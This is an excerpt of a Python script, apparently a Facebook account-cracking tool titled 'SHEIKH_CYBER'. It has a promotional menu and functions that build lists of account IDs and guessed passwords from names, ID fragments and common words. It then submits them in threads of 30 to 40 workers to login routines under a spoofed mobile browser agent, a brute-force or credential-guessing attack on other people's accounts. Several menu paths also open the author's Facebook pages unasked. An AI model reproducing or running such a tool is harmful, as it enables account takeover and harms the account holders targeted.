###----------[ IMPORT MODULE ]----------###
from os import path
from os import system as Love_SHEIKH
...
rgen=f' {K}[{RED}√{K}] {P}'
wt=f' {K}[{GREEN}?{K}] {P}'
fst=f'{dot}[{H}shati{M}={H}abir{M}={H}tisha{M}={H}Sheikh{M}={H}samim{P}]'
...
\x1b[97;1m   \x1b[97;1m [\x1b[91;1m•\x1b[97;1m] \033[1;31mGithub   : \x1b[97;1mKhorsed Sheikh    \x1b[97;1m
...
def mainx():
    ...
    print(f'{K} [{H}8{K}] {N}Contract Khorsed-Sheikh')
    print(f"{K} [{M}0{K}] {WHITE}Exit Tools ");print(led)
    Sheikh = input(f'{wt}Select menu {M}:{H} ')
    if Sheikh in ["1","01"]:
        exit()
    elif Sheikh in ["2","02"]:
        exit()
     ...
     os.system("xdg-open https://www.facebook.com/khorsedsheikh.420");mainx()
    elif Sheikh in ["0","00"]:
     print(f'{gen}{RED}Exited {H}SHEIKH {P}Terminal ');os.system("xdg-open https://www.facebook.com/khorsedsheikh.420");time.sleep(3);os.system('xdg-open https://www.facebook.com/groups/fb.SHEIKH.cyber/?ref=share');exit()
    else:
     print(f"{dot}{M}Don't Select Wrong Options ");os.system("xdg-open https://www.facebook.com/khorsedsheikh.420");mainx()
def mainx2():
    os.system("clear")
    banner()
...
def sep():
    ...
    print(led);print(f'{dot}Total File Ids {M}:{H} ' +
          str(len(open(file_name).read().splitlines())));print(led);print(f'{gen}Example {M}:{H} /sdcard/Sheikh.txt');print(led)
...
def dupcutter():
    os.system('clear');banner();print(f'{dot}Example   {RED}:{H} /sdcard/Sheikh.txt');print(led)
    Error = input(f"{wt}{N}File Name {RED}:{H} ");print(led);print(f'{dot}Example   {RED}:{H} /sdcard/Sheikh.txt');print(led)
...
def gf1(): 
    ...
    with tred(max_workers=40) as SHEIKH_xd:
        ...
        for number in idf:
            ...
            elif mthd in ['5','05']:SHEIKH_xd.submit(f1,idf,pwv)
    ...
    input('Press Enter To Go Menu');os.system('python SHEIKH_CYBER.py')
def gf2(): 
    idf=[]
    os.system('clear');banner();print(fst);print(led)
    first = input(f'{dot}First Name {M}: {H}');print(led);print(lst);print(led)
...
def x8():
  ...
  with tred(max_workers=30) as SHEIKH_xd:
    ...
    for guru in user:
      ...
      elif hc in ['2','02']:SHEIKH_xd.submit(t1,idf,pwv)
      elif hc in ['3','03']:SHEIKH_xd.submit(m3,idf,pwv)
      elif hc in ['4','04']:SHEIKH_xd.submit(m4,idf,pwv)
      elif hc in ['5','05']:SHEIKH_xd.submit(f1,idf,pwv)
...
def x7():
  ...
  with tred(max_workers=30) as SHEIKH_xd:
    ...
    for guru in user:
      ...
      if hc in ['1','01']:SHEIKH_xd.submit(m3,idf,pwv)
      elif hc in ['2','02']:SHEIKH_xd.submit(t1,idf,pwv)
      elif hc in ['3','03']:SHEIKH_xd.submit(m3,idf,pwv)
      elif hc in ['4','04']:SHEIKH_xd.submit(m4,idf,pwv)
      elif hc in ['5','05']:SHEIKH_xd.submit(f1,idf,pwv)
  ...
  input(f'{dot}Press Enter To Go Menu');os.system('python SHEIKH_CYBER.py')
...
def x6():
  ...
  with tred(max_workers=30) as SHEIKH_xd:
    ...
    for guru in user: 
      ...
      if hc in ['1','01']:SHEIKH_xd.submit(m33,idf,pwv)
  ...
  with tred(max_workers=30) as SHEIKH_xd:
    ...
    for guru in user:
     ...
     # pwv = [idf,guru,idf[:6],idf[:7],guru[1:]] #,'@#@#@#','bangladesh'] #,'@#@#@#','bangladesh','free fire','i love you']
      if 'm1' in mtd:SHEIKH_xd.submit(f1,idf,pwv)
      ...
      elif 'a1' in mtd:SHEIKH_xd.submit(f1,idf,pwv)
...
def m1(idf,pwv):
    ...
    rr = random.randint
    rc = random.choice
    ugen1 = f"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36"
